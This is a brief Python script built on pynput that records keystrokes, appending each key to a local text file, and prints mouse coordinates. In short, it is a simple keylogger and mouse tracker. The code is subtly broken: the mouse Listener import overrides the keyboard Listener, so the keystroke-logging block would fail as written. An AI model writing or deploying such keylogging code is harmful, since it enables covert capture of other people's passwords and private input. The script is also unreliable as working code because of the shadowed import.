from pynput.keyboard import Listener
from pynput.mouse import Listener
# listning to keyboard
def Writetofile(key):
    keydata = str(key)
    with open("listner.txt", "a") as f:
        f.write(keydata)


with Listener(on_press=Writetofile) as l:
    l.join()

# listning to mouse position
def forwardtofile(x, y):
    print("position of mouse is {}".format((x, y)))


with Listener(on_move=forwardtofile) as m:
    m.join()
